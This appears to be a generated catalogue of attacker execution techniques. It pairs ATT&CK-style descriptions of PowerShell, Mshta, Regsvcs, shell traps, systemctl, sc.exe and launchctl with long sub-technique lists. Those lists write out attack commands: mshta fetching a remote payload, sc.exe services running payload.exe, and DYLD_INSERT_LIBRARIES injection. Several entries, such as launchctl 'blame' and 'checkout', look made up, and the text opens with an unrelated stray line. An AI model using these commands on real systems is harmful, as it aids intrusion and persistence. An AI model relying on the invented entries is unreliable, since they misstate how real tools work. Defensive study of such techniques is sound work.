          Embed fileless malware in container image memory space
      ESXi Administration Command: Adversaries may abuse ESXi administration services to execute commands on guest machines hosted within an ESXi virtual environment. Persistent background services on ESXi-hosted VMs, such as the VMware Tools Daemon Service, allow for remote management from the ESXi server. The tools daemon service runs as `vmtoolsd.exe` on Windows guest operating systems, `vmware-tools-daemon` on macOS, and `vmtoolsd ` on Linux.(Citation: Broadcom VMware Tools Services)   Adversaries may leverage a variety of tools to execute commands on ESXi-hosted VMs – for example, by using the vSphere Web Services SDK to programmatically execute commands and scripts via APIs such as `StartProgramInGuest`, `ListProcessesInGuest`,  `ListFileInGuest`, and `InitiateFileTransferFromGuest`.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Broadcom Running Guest OS Operations) This may enable follow-on behaviors on the guest VMs, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083), [Data from Local System](https://attack.mitre.org/techniques/T1005), or [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).
        ~vSphere API Abuse: Exploitation of vSphere Web Services SDK APIs to execute commands and scripts on guest VMs through programmatic interfaces
        ~VMware Tools Service Manipulation: Direct interaction with VMware Tools daemon services to execute commands on guest operating systems
        ~ESXi Shell Commands: Using ESXi shell commands and utilities to manage and execute commands on virtual machines
        ~Remote Console Access: Abuse of virtual machine console access features to execute commands
        ~Guest Operations API Abuse: Specific exploitation of guest operations APIs for file transfers and command execution
        ~Management Agent Exploitation: Abuse of ESXi management agents and their communication channels
        ~PowerCLI Script Execution: Using PowerCLI scripts and commands to execute operations on guest VMs
        ~Virtual Machine Communication Interface (VMCI) Abuse: Exploitation of VMCI channels for command execution
      PowerShell: PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer.   PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.  Administrator permissions are required to use PowerShell to connect to remote systems.  A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)  PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)
        ~PowerShell Profile Modification: Adversaries may modify PowerShell profiles to establish persistence and execute malicious code whenever PowerShell starts.
        ~Fileless Execution: Adversaries may leverage PowerShell's ability to execute code directly in memory without writing to disk.
        ~Remote Command Execution: Adversaries may use PowerShell remoting features to execute commands on remote systems.
        ~Download Cradles: Adversaries may use PowerShell one-liners and cmdlets to download and execute malicious payloads from remote sources.
        ~Assembly Loading: Adversaries may load and execute .NET assemblies directly in PowerShell to bypass traditional detection mechanisms.
        ~PowerShell Module Abuse: Adversaries may abuse legitimate PowerShell modules or create malicious modules for execution.
        ~Script Block Logging Bypass: Adversaries may employ techniques to bypass PowerShell's script block logging capabilities.
        ~Constrained Language Mode Bypass: Adversaries may attempt to bypass PowerShell's constrained language mode restrictions.
        ~Encoded Commands: Adversaries may use encoded PowerShell commands to obfuscate malicious activities.
        ~Alternative Host Process Execution: Adversaries may execute PowerShell through alternative host processes to avoid detection.
        ~COM Object Manipulation: Adversaries may leverage PowerShell's ability to interact with COM objects for malicious purposes.
        ~WMI Integration: Adversaries may use PowerShell's WMI cmdlets to perform system reconnaissance and execute commands.
        ~Credential Access: Adversaries may abuse PowerShell's credential handling capabilities to extract or manipulate credentials.
        ~DSC Abuse: Adversaries may abuse PowerShell Desired State Configuration for persistent execution and configuration changes.
        ~Just Enough Administration (JEA) Bypass: Adversaries may attempt to bypass JEA restrictions to gain elevated privileges.
        ~PowerShell Empire Integration: Adversaries may leverage specific Empire-related PowerShell capabilities for post-exploitation.
        ~Background Jobs: Adversaries may use PowerShell jobs to execute commands asynchronously and maintain persistence.
        ~Transaction Abuse: Adversaries may abuse PowerShell transactions to make temporary system changes and evade detection.
        ~Event Subscription Abuse: Adversaries may abuse PowerShell's event subscription system for persistence and execution.
        ~Provider Manipulation: Adversaries may create or modify PowerShell providers to access protected resources or hide malicious activities.
        ~Custom Formatting and Type Extension Abuse: Adversaries may manipulate PowerShell's type and formatting system to execute malicious code.
        ~Variable Scope Manipulation: Adversaries may abuse PowerShell's variable scoping rules to hide malicious code or maintain persistence.
        ~Error Action Manipulation: Adversaries may manipulate error handling behavior to hide execution failures or trigger specific actions.
      Regsvcs/Regasm: Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)  Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)
        ~ComRegisterFunction Attribute: Using the ComRegisterFunction attribute to execute malicious code during assembly registration
        ~ComUnregisterFunction Attribute: Leveraging the ComUnregisterFunction attribute to execute code during assembly unregistration
        ~In-Memory Assembly Loading: Loading and executing .NET assemblies directly in memory through Regsvcs/Regasm
        ~Command Line Arguments: Using specific command-line parameters to modify registration behavior and execution flow
        ~Proxy DLL Registration: Registering malicious assemblies that act as proxies for legitimate COM components
        ~Assembly Modification: Modifying legitimate .NET assemblies to include malicious registration callbacks
        ~Remote Assembly Loading: Loading assemblies from network shares or remote locations
        ~Strong Name Bypass: Bypassing strong name verification during registration
        ~Alternative Registry Hives: Registering assemblies in non-standard registry locations
        ~Version Spoofing: Exploiting version-specific behaviors in different .NET Framework versions
      Mshta: Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)  Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017)   Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>  They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>  Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)
        ~Direct URL Execution: Execute malicious HTA files directly from remote URLs using mshta.exe
        ~Inline Script Execution: Use inline VBScript or JavaScript execution through mshta.exe command line
        ~Local File Execution: Execute locally stored HTA files using mshta.exe
        ~COM Object Abuse: Leverage COM objects through mshta.exe for code execution
        ~Proxy Execution: Use mshta.exe to proxy execution through other trusted Windows components
        ~Registry Integration: Execute HTA content stored in registry keys using mshta.exe
        ~Scheduled Task Abuse: Use scheduled tasks to trigger mshta.exe execution
        ~Network Share Execution: Execute HTA files from network shares using mshta.exe
        ~Command Line Parameter Abuse: Manipulate command line parameters for evasion and execution
        ~Environmental Variable Abuse: Leverage environment variables to control mshta.exe execution
        ~Alternate Data Stream Execution: Execute HTA content hidden in NTFS alternate data streams
        ~DLL Hijacking: Leverage DLL search order hijacking with mshta.exe
        ~Application Compatibility Shims: Use shims to modify mshta.exe behavior
        ~Credential Harvesting: Use mshta.exe to display fake authentication prompts
        ~Child Process Abuse: Leverage mshta.exe's ability to spawn other processes
        ~MIME Type Manipulation: Abuse MIME type handling to execute unexpected content
        ~Zone.Identifier Bypass: Manipulate mark-of-the-web controls to bypass security restrictions
        ~Unicode Directory Abuse: Use special Unicode characters in paths to obscure execution
        ~Group Policy Integration: Leverage group policy scripts for mshta.exe execution
        ~WMI Event Subscription: Use WMI events to trigger mshta.exe execution
      Trap: The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where "command list" will be executed when "signals" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)
        ~Unix Shell Trap: Adversaries may abuse trap commands in Unix-like shells (bash, sh, ksh) to execute malicious code when specific signals are received
        ~Signal Handler Manipulation: Adversaries may modify existing signal handlers or create new ones to intercept system signals for malicious code execution
        ~Interactive Shell Traps: Adversaries may specifically target interactive shell sessions to execute code when users attempt to exit or interrupt the session
        ~Login Shell Traps: Adversaries may implement traps in login shell configurations to persist malicious code execution across user sessions
        ~Script-Based Traps: Adversaries may embed trap commands in seemingly benign scripts to execute hidden malicious code when specific conditions are met
        ~System-Wide Trap Configuration: Adversaries may modify system-wide shell configuration files to implement traps affecting all users
        ~DEBUG Signal Traps: Adversaries may specifically abuse DEBUG signal traps in shell scripts to execute commands before each statement
        ~Trap Command Chaining: Adversaries may chain multiple trap commands together to create complex execution flows and fallback mechanisms
        ~Error Handler Traps: Adversaries may implement traps specifically targeting error conditions (ERR signal) to execute malicious code during script failures
        ~Terminal Control Traps: Adversaries may abuse WINCH (window change) and other terminal control signals to trigger malicious code execution
        ~Process Group Traps: Adversaries may implement traps that affect specific process groups to maintain persistence across related processes
        ~Subshell Trap Inheritance: Adversaries may exploit trap inheritance behavior in subshells to propagate malicious code execution
        ~Environment Variable Trap Manipulation: Adversaries may use environment variables to control trap behavior and evade detection
        ~Temporary File Cleanup Traps: Adversaries may abuse cleanup traps (typically used for temporary file removal) to hide malicious activities
        ~Job Control Signal Traps: Adversaries may target job control signals (SIGTSTP, SIGCONT) to execute malicious code during job state changes
      System Services: Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.
        Systemctl: Adversaries may abuse systemctl to execute commands or programs. Systemctl is the primary interface for systemd, the Linux init system and service manager. Typically invoked from a shell, Systemctl can also be integrated into scripts or applications.     Adversaries may use systemctl to execute commands or programs as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s. Common subcommands include: `systemctl start`, `systemctl stop`, `systemctl enable`, `systemctl disable`, and `systemctl status`.(Citation: Red Hat Systemctl 2022)
          Create and start a malicious service using "systemctl enable --now" with a unit file containing ExecStart=/path/to/malware
          Modify existing service unit files in /etc/systemd/system/ to include malicious commands
          Use systemctl to restart critical services with modified configurations to execute malware
          Create a transient service using "systemctl start" with --property=ExecStart= to run arbitrary commands
          Abuse systemctl with sudo/SUID privileges to execute commands as root
          Create timer units with systemctl to schedule periodic execution of malicious commands
          Use systemctl to mask legitimate services and replace them with malicious ones
          Exploit systemctl user service functionality to persist in user context without root
          Chain systemctl commands with environment variable manipulation for privilege escalation
          Use systemctl to load malicious kernel modules through service definitions
          Use systemctl show-environment and set-environment to inject malicious environment variables
          Exploit systemctl import-environment to affect system-wide service environments
          Create socket-activated services using systemctl to establish reverse shells
          Abuse systemctl daemon-reload to force reloading of modified service configurations
          Use systemctl edit to create service override files for stealthy modifications
          Exploit systemctl list-units to identify target services for hijacking
          Create systemctl service dependencies to ensure malware runs before critical services
          Use systemctl set-property to modify service runtime parameters for exploitation
          Abuse systemctl isolate to kill competing services and ensure malware execution
          Exploit systemctl reset-failed to hide service failure traces
          Abuse systemctl's remote management through systemd-socket-proxyd for lateral movement
          Exploit systemd-run for remote command execution through SSH connections
          Use systemctl with D-Bus interfaces to control services remotely
          Create snapshot units with systemctl to preserve malicious service states
          Exploit systemctl's container integration through machined and nspawn
          Abuse systemctl presets to automatically enable malicious services across system updates
          Use systemctl link to create references to malicious service files outside standard paths
          Exploit systemctl service template instantiation for dynamic malware deployment
          Abuse systemctl reload-or-restart for resilient malware execution
          Use systemctl with path units to monitor and respond to filesystem changes
          Abuse systemctl's resource control (CPUQuota, MemoryLimit) to perform DoS attacks
          Exploit systemctl's integration with journald to manipulate logging and hide activities
          Use systemctl with cgroup controllers to isolate and hide malicious processes
          Abuse systemctl's slice units to control resource allocation for malicious services
          Exploit systemctl's integration with PAM for credential theft
          Use systemctl's condition directives to create context-aware malicious services
          Abuse systemctl's mount unit handling to manipulate filesystem mounts
          Create scope units with systemctl to manage groups of malicious processes
          Exploit systemctl's socket activation patterns for covert command execution
          Use systemctl's service state transitions for timing-based attacks
        Service Execution: Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).  [PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.  Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.
          Use sc.exe to create and start a new service for command execution: "sc create malservice binPath= cmd.exe /c payload.exe"
          Leverage PsExec to execute commands remotely by creating temporary services: "psexec \\target -s cmd.exe"
          Use Windows Management Interface (WMI) to manipulate services remotely: "wmic /node:target service call create"
          Modify existing service binary paths to point to malicious executables using sc.exe: "sc config legitservice binPath= malware.exe"
          Create service via PowerShell commands: "New-Service -Name malservice -BinaryPathName payload.exe"
          Use net.exe commands to start/stop services: "net start malservice"
          Deploy services through Group Policy Objects (GPO) for widespread deployment
          Exploit service DLL hijacking by placing malicious DLL in service load path
          Use Service Control Manager API calls directly through custom code to create/modify services
          Abuse third-party service management tools like Sysinternals Suite for service manipulation
          Abuse service recovery actions to execute commands: "sc failure malservice command= payload.exe"
          Use non-standard service account creation: "sc.exe config malservice obj= "NT AUTHORITY\NetworkService""
          Execute commands through service trigger events: "sc triggerinfo malservice start/stop"
          Modify service DACL permissions: "sc sdset malservice D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)"
          Use Windows Remote Management (WinRM) for remote service manipulation: "winrm invoke Create wmicimv2/Win32_Service"
          Create service with delayed start: "sc config malservice start= delayed-auto"
          Exploit service dependencies for chain execution: "sc config malservice depend= requiredservice"
          Use Windows API RegisterServiceCtrlHandler for custom service behavior
          Leverage service isolation settings: "sc config malservice type= own"
          Execute through Interactive Services Detection using Windows API calls
          Use Windows Subsystem for Linux (WSL) to create Windows services: "wsl.exe --exec sc.exe create"
          Exploit service shared process hosting: "sc config malservice type= share"
          Create transient services that self-delete after execution: "sc create temp_service binPath= 'cmd /c payload.exe & sc delete temp_service'"
          Leverage service tag permissions: "sc privs malservice SeCreateTokenPrivilege/SeTcbPrivilege"
          Use service control programs through DCOM: "DCOM service control object manipulation"
          Execute through service Application Host (svchost.exe) grouping manipulation
          Abuse service image path tokens: "%COMSPEC% /c payload.exe"
          Create nested service dependencies for resilient execution
          Exploit service environment variables: "sc config malservice env= SPECIALVAR=value"
          Use service SID-type modifications: "sc config malservice sidtype= unrestricted"
        Launchctl: Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)  Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w "%s/Library/LaunchAgents/%s"</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)
          Execute "launchctl load -w ~/Library/LaunchAgents/com.malware.plist" to load a malicious Launch Agent
          Use "launchctl submit -l malicious_label -- /path/to/malicious/binary" to submit and run a malicious process
          Create and load a Launch Daemon using "sudo launchctl load -w /System/Library/LaunchDaemons/com.malware.plist"
          Use "echo 'load /Library/LaunchAgents/com.malware.plist' | launchctl" for stdin-based command execution
          Execute "launchctl start com.malware.service" to start a previously loaded service
          Use "launchctl bsexec PID /usr/bin/osascript malicious_script.scpt" to execute scripts in context of other processes
          Implement "launchctl setenv DYLD_INSERT_LIBRARIES /path/to/malicious.dylib" for library injection
          Create a script that uses "launchctl list" to enumerate running services and identify targets
          Use "launchctl reboot system" to force system restart after malware installation
          Execute "launchctl procinfo PID" to gather information about running processes for lateral movement
          Use "launchctl bootstrap system /path/to/malicious.plist" for system-wide service deployment
          Execute "launchctl kickstart -k system/com.malware.service" to force restart a service
          Use "launchctl print system/com.malware.service" to monitor service status and debugging
          Implement "launchctl limit maxfiles unlimited" to modify system resource limits
          Execute "launchctl dumpstate > /tmp/state.txt" to gather system service state information
          Use "launchctl remove com.malware.service" to clean up traces after execution
          Execute "launchctl runstats system/com.malware.service" to monitor service performance
          Use "launchctl config system" to modify system-wide launchd configuration
          Implement "launchctl debug system/com.malware.service --stderr" for redirecting error output
          Execute "launchctl kill SIGTERM system/com.malware.service" for targeted service termination
          Use "launchctl asuser UID /bin/bash -c 'malicious_command'" to execute as specific user
          Execute "launchctl managerpid" to identify launchd PID for process manipulation
          Use "launchctl checkout system/com.malware.service" for service version control
          Implement "launchctl examine system/com.malware.service" for detailed service inspection
          Execute "launchctl enable system/com.malware.service" to modify service state persistence
          Use "launchctl blame system/com.malware.service" to track service ownership
          Execute "launchctl kill SIGSTOP system/com.malware.service" for temporary service suspension
          Use "launchctl limit cpu unlimited" to remove CPU restrictions
          Execute "launchctl hostinfo" to gather system details for targeting
          Use "launchctl error ERROR_CODE" to decode launchd error messages for evasion
      Command and Scripting Interpreter: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).  There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).  Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)
        AutoHotKey & AutoIT: Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.(Citation: AutoIT)(Citation: AutoHotKey)  Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566) payloads.(Citation: Splunk DarkGate)  These scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation: AutoIT)(Citation: AutoHotKey)
          Script-Based Automation: Use of AHK/AutoIT scripts to automate system interactions and execute malicious actions
          Compiled Executable Deployment: Converting AHK/AutoIT scripts into standalone executables to evade detection
          GUI Automation: Leveraging GUI automation capabilities to interact with system interfaces and bypass security controls
          Keylogging Implementation: Using AHK/AutoIT's keyboard hook functionality to capture keystrokes
          Process Manipulation: Utilizing script capabilities to start, stop, or modify other processes
          Screen Capture: Employing built-in screen capture functions to harvest information
          Network Communication: Using native networking functions to establish C2 channels
          File System Operations: Leveraging file system access capabilities for data theft or manipulation
          Registry Manipulation: Using registry access features to maintain persistence or modify system settings
          Credential Harvesting: Exploiting GUI automation to capture login credentials from system dialogs
          Memory Operations: Using AHK/AutoIT's DllCall and other memory access functions to inject code or manipulate process memory
          Anti-Analysis Techniques: Implementing detection evasion through built-in functions to identify debugging environments
          Service Interaction: Automating interactions with Windows services and system components
          COM Object Manipulation: Leveraging COM object automation for system control and lateral movement
          Clipboard Monitoring: Using clipboard monitoring capabilities to intercept sensitive data
          Window Management: Exploiting window manipulation functions to hide malicious activities
          Mouse Movement Simulation: Using mouse automation to bypass human-presence detection
          Environmental Keying: Implementing environment-specific triggers to control malware execution
        PowerShell: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).  PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.  A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)  PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)
